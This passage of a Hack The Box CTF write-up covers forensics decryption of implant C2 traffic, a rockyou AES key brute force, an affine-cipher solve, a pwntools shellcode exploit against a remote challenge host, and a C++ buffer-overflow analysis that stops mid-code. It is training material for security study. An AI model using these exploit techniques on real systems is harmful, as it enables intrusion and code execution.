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")

uuid_state = int(uuid, 16)


cmd_key = []
current_state = uuid_state
for _ in range(len(cmd_encrypted)):
    current_state = reverse_lcg(current_state)
    cmd_key.append(current_state & 0xff)
cmd_key = cmd_key[::-1]
command = xor(cmd_encrypted, bytes(cmd_key))
print("Decrypted Command:", command)

output_key = []
current_state = uuid_state
for _ in range(len(otp_encrypted)):
    current_state = advance_lcg(current_state)
    output_key.append(current_state & 0xff)
output = xor(otp_encrypted, bytes(output_key))
print("Decrypted Output:", output.decode())

```

By decoding the commands, using the UUID sent and the outputs given, we get this as a command: `echo "H4sIAAE4/WYAA+1YOXLDMAzs9Ro+My0bPzAvyYwnlsjF7gKkncJJOGoIgMDipKT2efsYn9YaUmAfn4LEfcG2EVsgNvOiRrMogvW1okCaPD5v/f6MQZ4pj00HxkxRLNR+QukjuiB10roA1Ikzyvcl8UxNz0WNyaPFeMyuIaldMVCnHkH9tg2pVmWPUl3uRsd0FzGqaTmtckUXFbf7dSeqRJdpZzNGOz2J3T/w5p6ZepJVZinvor1ZRM2IuFDw9GOXe53y2FP7smsbDF0belpmtcFPAoVlcKRre9WpQK6LZCOVMXX3mn6BlfIu2QQ8U1QNHFEBaaIpgeCPCXftvhO0V2adqHXNt2VLmNvKPcdzVUQ587ELkVIgxYeManV30WmAhMW95EVBYn4FWUmZtmKdkqPSv1U8jUox8lif7/BnHbZIKZDiM9/+nRxoVDUSFveSl1qqIiooyQT3YrzjTpFYiOXR/sL69/L3rNFLMpL5soKK6S6znL275rvPqhW26zCGWD5GQiGURlAxwy3Yg2RBZHexKZmHFO0DJTN6yL8EPdJpujEshVeMAIz5OhOmu0YweIAM6he5Eo7V/l1FfZD/QVs5oUe8R2c1YIwAoeV0yeEGxUlRz5kVredbCABFyotcWThKHLcmzK+3lRlCOzbkNyZbuy3RSkS7WSWuD4I4cfQQ4smw37GlI9nPi7yfzk8P2g0xl7LEfjSbLK8xgQyVazxXxnQkiQCi0oJ7DHzF/UzldLFEr2hOaS0T45HBz4nuyPj+1c/wEjhlXBsYdAy2gxPk2RiSAZSqRy1zy1feZ+duuB7NUH8MzAHk+Z8JhmcglLBs2Fb+LgaByDJaRaWaC7D1eX+nBb1XLW5Yb+Uz5Hrb6ffyWjTV2voCIBKnivUiAAA=" | base64 -d | gunzip`. Running this on a machine, yields the flag in a nice format :)


FLAG: `HTB{still_not_convinced_about_LCG_security?}`

## cryptospiracy theory

We are only given a Python file which seems to have generated a file with an encrypted message, using AES with a key obtained from password.txt, ensuring that the key has length either 16, 24 or 32 bytes and is written only with letters and digits. I've tried brute-forcing for a bit, but that didn't work. Since that, I've began looking more into the text, and noticed that it was using password a lot, instead of key, which lead me to try to use `rockyou.txt` to gather the keys, and lo and behlod, it worked, and the password is `avengedsevenfold`.

```Python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# Load the encrypted file
with open('encrypted_message.aes', 'rb') as file:
    ciphertext = file.read()

# Attempt decryption
def decrypt_message(key, ciphertext):
    try:
        cipher = AES.new(key, AES.MODE_ECB)
        decrypted_message = b""
        block_size = AES.block_size

        for i in range(0, block_size * 10, block_size): # decrypt only a few blocks, ensuring it works
            block = ciphertext[i:i + block_size]
            decrypted_block = cipher.decrypt(block)
            decrypted_message += unpad(decrypted_block, block_size)
            decrypted_message += b" "

        return decrypted_message.decode('ascii')
    except (ValueError, UnicodeDecodeError):
        return None

# Run the brute-force
with open("rockyou.txt", "r", encoding="latin-1") as f:
    data = f.readlines()
data = [x.strip() for x in data]
data = [x for x in data if len(x) in [16, 24, 32]]
print(len(data))
for key in data:
    plaintext = decrypt_message(key.encode(), ciphertext)
    if plaintext:
        print(f"Key found: {key}")
        print(f"Decrypted message: {plaintext}")
        break
```

The decrypted text is: `b'Heygang,weareplanningtohijackthebankonthe25thofNovemberthisyear.Thehijackiscritical,andweneedtomakesuretosynconalldetails.Thetimeforthehijackwillbe3PM.Thelocationforthehijackwillbethemainbranch.Thebankisourtarget,andthehijackwillbesuccessful.Thishijackrequirestheutmostprecision.HTB{Br3@k_Th3Username:HacktheboxadminPassword:G7!xR9$sT@2mL^bW4&uV'`

After using the credentials to log in into the platform (we also get part of the flag), we are given another encryptor and encrypted file.

```Python
from math import gcd
import random

def encrypt(a, b):
    ct = []
    for ch in msg:
        if ch.isalpha():
            encrypted_char = chr(((a * (ord(ch) - 65 - b)) % 26) + 65)
            ct.append(encrypted_char)
        else :
            ct.append(ch)
    return ''.join(ct)


msg = open('secret_message.txt').read()

while True:
    a = random.randint(1, 26)
    b = random.randint(1, 26)
    if gcd(a, 26) == 1:
        break

with open('encrypted.txt', 'w') as f:
    f.write(encrypt(a,b))

print("Encrypted message saved to encrypted.txt")
```

That is an affine cipher, since the encryption does adhere to the form `E(x) = (a*x + b) mod m`, and thus the decryption is `D(x)= a^-1 * (x - b) mod m`. That conversion `ord(ch) - 65` is to 0 index the uppercase letters. This is further proved by the condition imposed for `a`, namely to be coprime with 26, the modulus. Looking for some words that may be in the encrypted text (some coordinates are given, so I chose `LATITUDE`), we can filter the resulting plaintexts and print the good one from bruteforcing.

```Python
def mod_inverse(a, m):
    for i in range(m):
        if (a * i) % m == 1:
            return i
    raise ValueError()

def decrypt(ciphertext, a, b):
    try:
        a_inv = mod_inverse(a, 26)
    except ValueError:
        return "fail"

    plaintext = []
    for ch in ciphertext:
        if ch.isalpha():
            x = ord(ch.upper()) - 65
            decrypted = (a_inv * (x - b)) % 26
            if ch.isupper():
                plaintext.append(chr(decrypted + 65))
            else:
                plaintext.append(chr(decrypted + 65).lower())
        else:
            plaintext.append(ch)
    
    return ''.join(plaintext)

a_r = [1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25]
b_r = range(26)
ciphertext = "YDAAV RBOR, EYFX FOKVQHBEFVO FX DGEQDHDAN PQFEFPBA. ZD BQD RVFOR EV LXD B IAVBE AVBW VK DGCAVXFSDX KVQ EYD BEEBPT BOW BAXV ZD BQD XLPPDXXKLA FO IQFIFOR EYD IBOT'X HBOBRDQ KVQ 25% VK EYD AVVE. ZD BQD BAXV PLQQDOEAN ZVQTFOR KQVH VLQ IBXD FO AVOWVO DGBPEAN BE: ABEFELWD: 51.5074, AVORFELWD: -0.1278. KABR: _IA0PT_C@EE3QO}"
ok = 0
for a in a_r:
    for b in b_r:
        plain = decrypt(ciphertext, a, b)
        if "LATITUDE" in plain:
            print(plain)
            ok = 1
            break
    if ok:
        break
```

FLAG: `HTB{Br3@k_Th3_BL0CK_P@TT3RN}`

# Pwn

## Reconstruction

We are given an ELF, where we need to give it some input, which goes through some validations and then gets executed. Afterwards, our program checks that the input is valid, meaning it only contains the required bytes, and if so, executes it. After execution, it expects certain values in the given registers.
Thus, we need to create some shellcode that simply sets those values into those registers.

```Python
from pwn import *
binary_path = "./reconstruction" 

# p = process(binary_path) # local testing
p = remote("83.136.254.33",  30774)
p.sendline(b"fix")
sc = asm("mov r8, 0x1337C0DE; mov r9, 0xDEADBEEF; mov r10, 0xDEAD1337; mov r12, 0x1337CAFE; mov r13, 0xBEEFC0DE; mov r14, 0x13371337; mov r15, 0x1337DEAD", arch='amd64', os='linux')
sc += b"\xc3" # sc len is 0x3a, pad with 0xc3 to be able to use sendline, since it adds a 0xa which is not allowed

# whitelist check
allowed = [0x49, 0xc7, 0xb9, 0xc0, 0xde, 0x37, 0x13, 0xc4, 0xc6, 0xef, 0xbe, 0xad, 0xca, 0xfe, 0xc3, 0x00, 0xba, 0xbd]
for i, c in enumerate(sc):
	if c not in allowed:
		print("Opcode " + str(c) + " at idx " + str(i) + " not allowed :(")

p.sendline(sc)
p.interactive()

```

FLAG: `HTB{r3c0n5trucT_d3m_r3g5_e2f7d8c5659b0d726dc97f834d38285f}`

## Recruitement

We are given a ELF, together with libc binaries. It seems to be a C++ binary, which seems to implement a simple menu-driven application, allowing us to create a profile (name, class and age), display it or embark on a journey. The main function is without any issues. However, analyzing the `journey` one, we see a buffer overflow possible, since the variable used to read our data has 8 bytes, and there are 47 bytes being read into it:

```C++
__int64 __fastcall journey(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  char v8[8]; // [rsp+10h] [rbp-20h] BYREF
  __int64 v9; // [rsp+18h] [rbp-18h]
  __int64 v10; // [rsp+20h] [rbp-10h]
  __int64 v11; // [rsp+28h] [rbp-8h]

  flag = 3;
  v1 = std::operator<<<std::char_traits<char>>(
         &std::cout,
         "\x1B[1;32m\n[!] The fate of the Frontier Cluster lies on loyal and brave Space Cowpokes like you [ ");
  v2 = std::operator<<<std::char_traits<char>>(v1, "\x1B[1;35m");
  v3 = std::operator<<<char>(v2, a1);
  v4 = std::operator<<<std::char_traits<char>>(v3, "\x1B[1;32m");
  v5 = std::operator<<<std::char_traits<char>>(v4, " ].");
  v6 = std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
  std::operator<<<std::char_traits<char>>(
    v6,
    "    We need you to tell us a bit about you so that we can assign to you your first mission: ");
  *(_QWORD *)v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  return std::istream::getline((std::istream *)&std::cin, v8, 47LL);
}
```

Thus, we get a primitive for redirecting execution. Now we need to look for a way know what and where to execute. No "win" functions present, and no `pop rdi` gadgets, thus we cannot call `system` and load `/bin/sh` in rdi, so this seems to be the job for `one_gadget`. Since we have the libc already, we can easily see what gadgets we can use. However, we still need to find a way to leak libc addresses (we cannot redirect to `puts@PLT` to print `puts@GOT` or something else since we don't have gadgets to load arguments into registers).

The `display` function doesn't have any modifiable printing primitives, it just prints a profile that's previously created, having all strings as attributes and using `<<`, thus not much to exploit there.

Lastly, there is the `create_profile` function, which should have our necessary vulnerability. Analyzing it, we see it does.

```C++
char **create_profile(void)
{
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v14; // rax
  const char *v15; // rax
  const char *v16; // rax
  char **v17; // rbx
  char buf[256]; // [rsp+0h] [rbp-160h] BYREF
  char v20[32]; // [rsp+100h] [rbp-60h] BYREF
  char v21[32]; // [rsp+120h] [rbp-40h] BYREF
  char **v22; // [rsp+140h] [rbp-20h]
  int i; // [rsp+14Ch] [rbp-14h]

  v22 = (char **)operator new[](24uLL);
  for ( i = 0; i <= 2; ++i )
    v22[i] = (char *)operator new[](100uLL);
  std::string::basic_string(v21);
  std::string::basic_string(v20);
  fflush(_bss_start);
  std::operator<<<std::char_traits<char>>(
    &std::cout,
    "\n[*] You need to enter your Name, Class, and Age.\n\n[+] Name:  ");
  std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, v21);
  std::operator<<<std::char_traits<char>>(&std::cout, "[+] Class: ");
  std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, v20);
  std::operator<<<std::char_traits<char>>(&std::cout, "[+] Age:   ");
  read(0, buf, 0x20u);
  v0 = std::operator<<<std::char_traits<char>>(&std::cout, &unk_404010);
  v1 = std::operator<<<std::char_traits<char>>(v0, "\x1B[1;35m");
  v2 = std::operator<<<char>(v1, v21);
  v3 = std::operator<<<std::char_traits<char>>(v2, "\x1B[1;34m");
  v4 = std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  v5 = std::operator<<<std::char_traits<char>>(v4, "[*] Class: ");
  v6 = std::operator<<<std::char_traits<char>>(v5, "\x1B[1;33m");
  v7 = std::operator<<<char>(v6, v20);
  v8 = std::operator<<<std::char_traits<char>>(v7, "\x1B[1;34m");
  v9 = std::ostream::operator<<(v8, &std::endl<char,std::char_traits<char>>);
  v10 = std::operator<<<std::char_traits<char>>(v9, "[*] Age:   ");
  v11 = std::operator<<<std::char_traits<char>>(v10, buf);
  v12 = std::ostream::operator<<(v11, &std::endl<char,std::char_traits<char>>);
